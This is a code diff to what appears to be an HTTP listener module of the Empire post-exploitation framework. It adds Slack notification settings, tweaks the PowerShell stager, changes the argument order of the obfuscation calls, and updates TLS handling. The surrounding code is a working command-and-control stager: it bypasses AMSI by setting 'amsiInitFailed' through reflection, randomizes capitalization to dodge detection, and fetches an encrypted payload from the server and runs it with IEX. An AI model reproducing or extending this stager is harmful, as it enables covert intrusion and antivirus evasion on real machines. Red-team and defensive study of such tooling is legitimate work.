@@ -5,6 +5,7 @@ import os
 import ssl
 import time
 import copy
+import sys
 from pydispatch import dispatcher
 from flask import Flask, request, make_response
 
@@ -107,6 +108,16 @@ class Listener:
                 'Description'   :   'Server header for the control server.',
                 'Required'      :   True,
                 'Value'         :   'Microsoft-IIS/7.5'
+            },
+            'SlackToken' : {
+                'Description'   :   'Your SlackBot API token to communicate with your Slack instance.',
+                'Required'      :   False,
+                'Value'         :   ''
+            },
+            'SlackChannel' : {
+                'Description'   :   'The Slack channel or DM that notifications will be sent to.',
+                'Required'      :   False,
+                'Value'         :   '#general'
             }
         }
 
@@ -170,7 +181,7 @@ class Listener:
             if language.startswith('po'):
                 # PowerShell
 
-                stager = ''
+                stager = '$ErrorActionPreference = \"SilentlyContinue\";'
                 if safeChecks.lower() == 'true':
                     stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
 
@@ -195,7 +206,7 @@ class Listener:
                     stager += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
                     stager += "'amsiInitFailed','NonPublic,Static'"
                     stager += helpers.randomize_capitalization(").SetValue($null,$true)};")
-                    stager += "}"
+                    stager += "};"
                     stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
 
                 # TODO: reimplement stager retries?
@@ -235,7 +246,7 @@ class Listener:
                 stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
 
                 if obfuscate:
-                    stager = helpers.obfuscate(stager, self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
+                    stager = helpers.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
                 # base64 encode the stager and return it
                 if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                     return helpers.powershell_launcher(stager, launcher)
@@ -303,7 +314,7 @@ class Listener:
                         randomizedStager += line
 
             if obfuscate:
-                randomizedStager = helpers.obfuscate(randomizedStager, self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
+                randomizedStager = helpers.obfuscate(self.mainMenu.installPath, randomizedStager, obfuscationCommand=obfuscationCommand)
             # base64 encode the stager and return it
             if encode:
                 return helpers.enc_powershell(randomizedStager)
@@ -359,7 +370,7 @@ class Listener:
             if killDate != "":
                 code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
             if obfuscate:
-                code = helpers.obfuscate(code, self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
+                code = helpers.obfuscate(self.mainMenu.installPath, code, obfuscationCommand=obfuscationCommand)
             return code
 
         else:
@@ -450,6 +461,10 @@ class Listener:
                                 }
                                 catch [System.Net.WebException]{
                                     # exception posting data...
+                                    if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
+                                        # restart key negotiation
+                                        Start-Negotiate -S "$ser" -SK $SK -UA $ua
+                                    }
                                 }
                             }
                         }
@@ -620,7 +635,17 @@ class Listener:
             host = listenerOptions['Host']['Value']
             if certPath.strip() != '' and host.startswith('https'):
                 certPath = os.path.abspath(certPath)
-                context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
+
+                # support any version of tls
+                pyversion = sys.version_info
+                if pyversion[0] == 2 and pyversion[1] == 7 and pyversion[2] >= 13:
+                    proto = ssl.PROTOCOL_TLS
+                elif pyversion[0] >= 3:
+                    proto = ssl.PROTOCOL_TLS
+                else:
+                    proto = ssl.PROTOCOL_SSLv23
+
+                context = ssl.SSLContext(proto)
                 context.load_cert_chain("%s/empire-chain.pem" % (certPath), "%s/empire-priv.key"  % (certPath))
                 app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
             else:
